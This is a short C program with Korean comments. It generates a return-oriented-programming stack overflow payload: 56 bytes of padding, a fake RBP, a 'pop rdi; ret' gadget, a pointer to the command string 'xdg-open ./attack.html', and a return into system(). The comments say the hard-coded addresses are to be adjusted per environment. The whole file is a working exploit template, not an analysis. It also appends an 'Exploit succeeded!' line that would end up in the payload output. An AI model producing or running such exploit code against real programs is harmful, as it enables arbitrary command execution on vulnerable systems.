#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main() {
    char payload[200];

    uintptr_t cmd_str_addr = 0x404050;  // 실제 삽입 주소로 수정 필요

    // system() 함수 주소 (libc에서 확인한 실제 주소)
    uintptr_t system_addr = 0x7ffff7e058f0;  // 환경에 맞게 수정

    // pop rdi; ret 가젯 주소 (ROPgadget 등으로 찾은 주소)
    uintptr_t pop_rdi_ret = 0x40123b;  // 환경에 맞게 수정

    // 1. 패딩 56바이트 (리턴 주소까지 도달)
    memset(payload, 'A', 56);

    // 2. fake RBP
    *(uintptr_t *)(payload + 56) = 0x4141414141414141;

    // 3. pop rdi; ret
    *(uintptr_t *)(payload + 64) = pop_rdi_ret;

    // 4. rdi = "xdg-open ./attack.html"
    *(uintptr_t *)(payload + 72) = cmd_str_addr;

    // 5. ret to system()
    *(uintptr_t *)(payload + 80) = system_addr;

    // 페이로드 출력
    fwrite(payload, 1, 88, stdout);
    puts("Exploit succeeded!\n");

    return 0;
}
